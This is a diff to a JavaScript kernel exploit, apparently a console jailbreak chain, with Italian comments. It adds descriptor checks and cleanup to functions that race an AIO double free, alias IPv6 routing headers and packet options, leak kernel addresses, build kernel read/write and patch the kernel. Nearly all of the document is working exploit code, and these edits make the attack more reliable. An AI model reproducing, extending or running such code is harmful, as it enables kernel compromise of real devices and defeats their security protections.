@@ -172,12 +172,20 @@ function fullCleanup() {
     // 3) Pulizia socket IPv6 (pktopts/pktinfo/rthdr) e chiusura FD
     try {
         for (const sd of debug_sds) {
-            try {
-                setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-                setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0);
-                setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-            } catch (_) {}
-            try { close(sd); } catch (_) {}
+            if (typeof sd === 'number' && sd >= 0) {
+                try {
+                    setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                } catch (_) {}
+                try {
+                    setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0);
+                } catch (_) {}
+                try {
+                    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0);
+                } catch (_) {}
+                try {
+                    close(sd);
+                } catch (_) {}
+            }
         }
         log(`   ✅ Puliti e chiusi ${debug_sds.length} socket IPv6`);
     } catch (e) {
@@ -188,7 +196,9 @@ function fullCleanup() {
     // 4) Chiusura socket TCP/UDP/UNIX residui
     try {
         for (const sd of debug_tcp_sds) {
-            try { close(sd); } catch (_) {}
+            if (typeof sd === 'number' && sd >= 0) {
+                try { close(sd); } catch (_) {}
+            }
         }
         log(`   ✅ Chiusi ${debug_tcp_sds.length} socket TCP/UDP/UNIX`);
     } catch (e) {
@@ -231,11 +241,11 @@ function fullCleanup() {
 
     // 8) Chiusura FD JIT se esistenti
     try {
-        if (typeof debug_exec_fd === 'number') {
+        if (typeof debug_exec_fd === 'number' && debug_exec_fd >= 0) {
             close(debug_exec_fd);
             debug_exec_fd = undefined;
         }
-        if (typeof debug_write_fd === 'number') {
+        if (typeof debug_write_fd === 'number' && debug_write_fd >= 0) {
             close(debug_write_fd);
             debug_write_fd = undefined;
         }
@@ -256,9 +266,6 @@ function fullCleanup() {
     } catch (e) {
         log(`   ❌ Errore ripristino sysent: ${e}`);
     }
-
-    // 10) Chiudiamo eventuali socket rimanenti in possibili liste ausiliarie:
-    //     sds_alt (se definita), pipe UNIX, ecc. (vedi “FINAL CLEANUP” in kexploit).
 
     log("🔧 ⇒ fullCleanup() COMPLETATO");
 }
@@ -402,13 +409,17 @@ function close(fd) {
 
 function new_socket() {
     const sd = sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-    debug_sds.push(sd);
+    if (typeof sd === 'number' && sd >= 0) {
+        debug_sds.push(sd);
+    }
     return sd;
 }
 
 function new_tcp_socket() {
     const sd = sysi('socket', AF_INET, SOCK_STREAM, 0);
-    debug_tcp_sds.push(sd);
+    if (typeof sd === 'number' && sd >= 0) {
+        debug_tcp_sds.push(sd);
+    }
     return sd;
 }
 
@@ -436,11 +447,27 @@ function set_rthdr(sd, buf, len) {
     ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
 }
 
-// === Aggiornamento: free_rthdrs completo ===
+// ==============================
+// free_rthdrs esteso per pulire tutto e chiudere FD
+// ==============================
 function free_rthdrs(sds) {
+    const zeroBuf = new Buffer(0);
     for (const sd of sds) {
-        try { setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-        try { close(sd); } catch (_) {}
+        if (typeof sd !== 'number' || sd < 0) {
+            continue;
+        }
+        try {
+            setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        } catch (_) {}
+        try {
+            setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, 0);
+        } catch (_) {}
+        try {
+            setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
+        } catch (_) {}
+        try {
+            close(sd);
+        } catch (_) {}
     }
     sds.length = 0;
 }
@@ -496,6 +523,7 @@ function make_aliased_rthdrs(sds) {
             }
         }
     }
+    // Se non ho trovato una coppia, pulisco e sbatto un die
     free_rthdrs(sds);
     fullCleanup();
     die(`failed to make aliased rthdrs. size: ${hex(size)}`);
@@ -535,7 +563,9 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
 
     if (main_res === -1) {
-        call_nze('pthread_join', pthr, 0);
+        if (typeof pthr.addr === 'number' && pthr.addr >= 0) {
+            call_nze('pthread_join', pthr, 0);
+        }
         return null;
     }
 
@@ -550,6 +580,8 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
         log(`info size: ${hex(info_size)}`);
 
         if (info_size !== size_tcp_info) {
+            // pulisco prima di die
+            try { free_rthdrs(sds); } catch (_) {}
             die(`info size isn't ${size_tcp_info}: ${info_size}`);
         }
 
@@ -571,6 +603,9 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
         log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
         if (sce_errs[0] !== sce_errs[1]) {
             log('ERROR: bad won_race');
+            // pulisco prima di die
+            try { free_rthdrs(sds); } catch (_) {}
+            fullCleanup();
             die('ERROR: bad won_race');
         }
         return make_aliased_rthdrs(sds);
@@ -624,23 +659,30 @@ function double_free_reqs2(sds) {
         aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
         aio_multi_cancel(aio_ids_p, num_reqs);
         aio_multi_poll(aio_ids_p, num_reqs);
-        close(sd_client);
+        if (typeof sd_client === 'number' && sd_client >= 0) {
+            close(sd_client);
+        }
 
         const res = race_one(req_addr, sd_conn, barrier, racer, sds);
         racer.reset();
 
         aio_multi_delete(aio_ids_p, num_reqs);
-        close(sd_conn);
+        if (typeof sd_conn === 'number' && sd_conn >= 0) {
+            close(sd_conn);
+        }
 
         if (res !== null) {
             log(`won race at attempt: ${i}`);
-            close(sd_listen);
+            if (typeof sd_listen === 'number' && sd_listen >= 0) {
+                close(sd_listen);
+            }
             call_nze('pthread_barrier_destroy', barrier.addr);
             debug_barrier_id = null;
             return res;
         }
     }
 
+    // pulisco in emergenza
     free_rthdrs(sds);
     fullCleanup();
     die('failed aio double free');
@@ -649,7 +691,9 @@ function double_free_reqs2(sds) {
 function new_evf(flags) {
     const name = cstr('');
     const id = sysi('evf_create', name.addr, 0, flags);
-    debug_evf_ids.push(id);
+    if (typeof id === 'number' && id >= 0) {
+        debug_evf_ids.push(id);
+    }
     return id;
 }
 
@@ -687,7 +731,9 @@ function verify_reqs2(buf, offset) {
 }
 
 function leak_kernel_addrs(sd_pair) {
-    close(sd_pair[1]);
+    if (typeof sd_pair[1] === 'number' && sd_pair[1] >= 0) {
+        close(sd_pair[1]);
+    }
     const sd = sd_pair[0];
     const buf = new Buffer(0x80 * leak_len);
 
@@ -709,14 +755,18 @@ function leak_kernel_addrs(sd_pair) {
         } else {
             evf = null;
         }
-        for (const e of evfs) free_evf(e);
+        for (const e of evfs) {
+            try { free_evf(e); } catch (_) {}
+        }
         if (evf !== null) {
             log(`confused rthdr and evf at attempt: ${i}`);
             break;
         }
     }
     if (evf === null) {
-        for (const e of debug_evf_ids) try { free_evf(e); } catch (_) {}
+        for (const e of debug_evf_ids) {
+            try { free_evf(e); } catch (_) {}
+        }
         debug_evf_ids = [];
         fullCleanup();
         die('failed to confuse evf and rthdr');
@@ -761,7 +811,9 @@ function leak_kernel_addrs(sd_pair) {
     }
     if (reqs2_off === null) {
         free_aios(leak_ids_p, leak_ids_len);
-        for (const e of debug_evf_ids) try { free_evf(e); } catch (_) {}
+        for (const e of debug_evf_ids) {
+            try { free_evf(e); } catch (_) {}
+        }
         debug_evf_ids = [];
         fullCleanup();
         die('could not leak a reqs2');
@@ -801,7 +853,9 @@ function leak_kernel_addrs(sd_pair) {
     }
     if (target_id === null) {
         free_aios(leak_ids_p, leak_ids_len);
-        for (const e of debug_evf_ids) try { free_evf(e); } catch (_) {}
+        for (const e of debug_evf_ids) {
+            try { free_evf(e); } catch (_) {}
+        }
         debug_evf_ids = [];
         fullCleanup();
         die('target_id not found');
@@ -843,10 +897,12 @@ function make_aliased_pktopts(sds) {
 
     // Pulizia di emergenza se non trova la coppia “aliased”
     for (const sd of sds) {
-        try { setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
-        try { setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0); } catch (_) {}
-        try { setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-        try { close(sd); } catch (_) {}
+        if (typeof sd === 'number' && sd >= 0) {
+            try { setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
+            try { setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0); } catch (_) {}
+            try { setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+            try { close(sd); } catch (_) {}
+        }
     }
     fullCleanup();
     die('failed to make aliased pktopts');
@@ -867,7 +923,7 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
 
     log('start overwrite rthdr with AIO queue entry loop');
     let aio_not_found = true;
-    free_evf(evf);
+    try { free_evf(evf); } catch (_) {}
     for (let i = 0; i < num_clobbers; i++) {
         spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
         if (get_rthdr(sd, buf, max_leak_len) === 8 && buf.read32(0) === AIO_CMD_READ) {
@@ -880,10 +936,12 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
     }
     if (aio_not_found) {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0); } catch (_) {}
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0); } catch (_) {}
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('failed to overwrite rthdr');
@@ -911,7 +969,9 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
 
     log('start overwrite AIO queue entry with rthdr loop');
     let req_id = null;
-    close(sd);
+    if (typeof sd === 'number' && sd >= 0) {
+        close(sd);
+    }
     sd = null;
     for (let i = 0; i < num_alias; i++) {
         for (const s of sds) {
@@ -950,10 +1010,12 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
                 }
                 if (sd === null) {
                     for (const sd3 of sds) {
-                        try { setsockopt(sd3, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
-                        try { setsockopt(sd3, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0); } catch (_) {}
-                        try { setsockopt(sd3, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-                        try { close(sd3); } catch (_) {}
+                        if (typeof sd3 === 'number' && sd3 >= 0) {
+                            try { setsockopt(sd3, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
+                            try { setsockopt(sd3, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0); } catch (_) {}
+                            try { setsockopt(sd3, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                            try { close(sd3); } catch (_) {}
+                        }
                     }
                     fullCleanup();
                     die("can't find sd that overwrote AIO queue entry");
@@ -966,10 +1028,12 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
     }
     if (req_id === null) {
         for (const sd3 of sds) {
-            try { setsockopt(sd3, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
-            try { setsockopt(sd3, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0); } catch (_) {}
-            try { setsockopt(sd3, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd3); } catch (_) {}
+            if (typeof sd3 === 'number' && sd3 >= 0) {
+                try { setsockopt(sd3, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
+                try { setsockopt(sd3, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0); } catch (_) {}
+                try { setsockopt(sd3, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd3); } catch (_) {}
+            }
         }
         fullCleanup();
         die('failed to overwrite AIO queue entry');
@@ -1005,10 +1069,12 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
         }
         if (!success) {
             for (const sd3 of sds) {
-                try { setsockopt(sd3, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
-                try { setsockopt(sd3, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0); } catch (_) {}
-                try { setsockopt(sd3, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-                try { close(sd3); } catch (_) {}
+                if (typeof sd3 === 'number' && sd3 >= 0) {
+                    try { setsockopt(sd3, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
+                    try { setsockopt(sd3, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0); } catch (_) {}
+                    try { setsockopt(sd3, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                    try { close(sd3); } catch (_) {}
+                }
             }
             fullCleanup();
             die('ERROR: double free on a 0x100 malloc zone failed');
@@ -1028,7 +1094,9 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     log('overwrite main pktopts');
     let reclaim_sd = null;
-    close(pktopts_sds[1]);
+    if (typeof pktopts_sds[1] === 'number' && pktopts_sds[1] >= 0) {
+        close(pktopts_sds[1]);
+    }
     for (let i = 0; i < num_alias; i++) {
         for (let j = 0; j < sds.length; j++) {
             pktopts.write32(off_tclass, 0x4141 | (j << 16));
@@ -1046,10 +1114,12 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
     if (reclaim_sd === null) {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0); } catch (_) {}
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0); } catch (_) {}
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_PKTINFO, new Buffer(0), 0); } catch (_) {}
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('failed to overwrite main pktopts');
@@ -1086,8 +1156,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log(`*(&"evf cv"): ${kstr}`);
     if (kstr !== 'evf cv') {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('test read of &"evf cv" failed');
@@ -1119,8 +1191,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log(`suspected proc pid: ${pid2}`);
     if (pid2 !== pid) {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('process not found');
@@ -1164,8 +1238,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     if (m_pktopts.ne(k100_addr)) {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('main pktopts pointer != leaked pktopts pointer');
@@ -1197,8 +1273,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log(`*(&"evf cv"): ${kstr2}`);
     if (kstr2 !== 'evf cv') {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('pktopts read failed');
@@ -1297,8 +1375,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log(`*(&"evf cv"): ${kstr3}`);
     if (kstr3 !== 'evf cv') {
         for (const sd2 of sds) {
-            try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, 0, 0); } catch (_) {}
-            try { close(sd2); } catch (_) {}
+            if (typeof sd2 === 'number' && sd2 >= 0) {
+                try { setsockopt(sd2, IPPROTO_IPV6, IPV6_RTHDR, new Buffer(0), 0); } catch (_) {}
+                try { close(sd2); } catch (_) {}
+            }
         }
         fullCleanup();
         die('pipe read failed');
@@ -1319,11 +1399,17 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     try {
         const zeroBuf = new Buffer(0x100);
         for (const sdCleanup of pktopts_sds.concat(sds)) {
-            try {
-                setsockopt(sdCleanup, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-                setsockopt(sdCleanup, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
-                setsockopt(sdCleanup, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
-            } catch (_) {}
+            if (typeof sdCleanup === 'number' && sdCleanup >= 0) {
+                try {
+                    setsockopt(sdCleanup, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                } catch (_) {}
+                try {
+                    setsockopt(sdCleanup, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
+                } catch (_) {}
+                try {
+                    setsockopt(sdCleanup, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
+                } catch (_) {}
+            }
         }
         log("   ✅ pktopts/pktinfo/rthdr azzerati per tutti i socket residui");
     } catch (e) {
@@ -1384,7 +1470,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     const max_size = 0x10000000;
     if (map_size > max_size) {
         fullCleanup();
-        die(`patch file too large (>${max_size}): ${map_size}`);
+        die(`patch file troppo grande (>${max_size}): ${map_size}`);
     }
     if (map_size === 0) {
         fullCleanup();
@@ -1570,7 +1656,12 @@ export async function kexploit() {
     const [block_fd, unblock_fd] = (() => {
         const unix_pair = new View4(2);
         sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
-        debug_tcp_sds.push(unix_pair[0], unix_pair[1]);
+        if (typeof unix_pair[0] === 'number' && unix_pair[0] >= 0) {
+            debug_tcp_sds.push(unix_pair[0]);
+        }
+        if (typeof unix_pair[1] === 'number' && unix_pair[1] >= 0) {
+            debug_tcp_sds.push(unix_pair[1]);
+        }
         return unix_pair;
     })();
 
@@ -1600,7 +1691,9 @@ export async function kexploit() {
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kernel_addr.sub(0x7f6f27), kmem, p_ucred, restore_info);
     } finally {
-        close(unblock_fd);
+        if (typeof unblock_fd === 'number' && unblock_fd >= 0) {
+            close(unblock_fd);
+        }
 
         const t2 = performance.now();
         const ftime = t2 - t1;
@@ -1615,7 +1708,9 @@ export async function kexploit() {
     // ─────────────────────────────────────────────────────
     // FINAL CLEANUP: chiudo block_fd, groom_ids, block_id, sds, unblock_fd, debug_tcp_sds, sds_alt
     // ─────────────────────────────────────────────────────
-    try { close(block_fd); } catch (_) {}
+    if (typeof block_fd === 'number' && block_fd >= 0) {
+        close(block_fd);
+    }
 
     if (groom_ids) {
         free_aios2(groom_ids.addr, groom_ids.length);
@@ -1627,29 +1722,50 @@ export async function kexploit() {
     }
 
     for (const sd of sds) {
-        try { close(sd); } catch (_) {}
+        if (typeof sd === 'number' && sd >= 0) {
+            close(sd);
+        }
+    }
+    sds.length = 0;
+
+    if (typeof unblock_fd === 'number' && unblock_fd >= 0) {
+        close(unblock_fd);
     }
 
-    try { close(unblock_fd); } catch (_) {}
-
     for (const sdTcp of debug_tcp_sds) {
-        try { close(sdTcp); } catch (_) {}
+        if (typeof sdTcp === 'number' && sdTcp >= 0) {
+            close(sdTcp);
+        }
     }
     debug_tcp_sds.length = 0;
 
     if (typeof sds_alt !== 'undefined' && Array.isArray(sds_alt)) {
         for (const sdAlt of sds_alt) {
-            try { close(sdAlt); } catch (_) {}
+            if (typeof sdAlt === 'number' && sdAlt >= 0) {
+                close(sdAlt);
+            }
         }
         sds_alt.length = 0;
     }
     // ─────────────────────────────────────────────────────
 
+    // ─────────── ULTERIORE passata di “pulizia puntatori IPv6” ───────────
+    try { free_rthdrs(sds); } catch (_) {}
+    try { free_rthdrs(pktopts_sds); } catch (_) {}
+    if (typeof sds_alt !== 'undefined' && Array.isArray(sds_alt)) {
+        try { free_rthdrs(sds_alt); } catch (_) {}
+    }
+    for (const id of debug_evf_ids) {
+        try { free_evf(id); } catch (_) {}
+    }
+    debug_evf_ids.length = 0;
+    // ─────────────────────────────────────────────────────────────────────
+
     // Debug finale: stampa stato di tutte le risorse di debug
     log("––––– STATO FINALE DEBUG –––––");
     log(`debug_sds:         ${debug_sds.length ? debug_sds.join(", ") : "nessuno"}`);
     log(`debug_tcp_sds:     ${debug_tcp_sds.length ? debug_tcp_sds.join(", ") : "nessuno"}`);
-    log(`debug_evf_ids:     ${debug_evf_ids.length ? debug_evf_ids.join(", ") : "nessuno"}`);
+    log(`debug_evf_ids:     ${debug_evf_ids.length}`);
     log(`debug_leak_ids_p:  ${debug_leak_ids_p ? "0x" + debug_leak_ids_p.toString(16) : "null"}`);
     log(`debug_leak_ids_len:${debug_leak_ids_len}`);
     log(`debug_barrier_id:  ${debug_barrier_id ? "0x" + debug_barrier_id.addr.toString(16) : "null"}`);
@@ -1676,6 +1792,7 @@ function malloc32(sz) {
     ptr.backing = new Uint32Array(backing.buffer);
     return ptr;
 }
+
 function array_from_address(addr, size) {
 var og_array = new Uint32Array(0x1000);
 var og_array_i = mem.addrof(og_array).add(0x10);
@@ -1729,5 +1846,3 @@ var req = new XMLHttpRequest();
     );	
 }
  };
-
-});
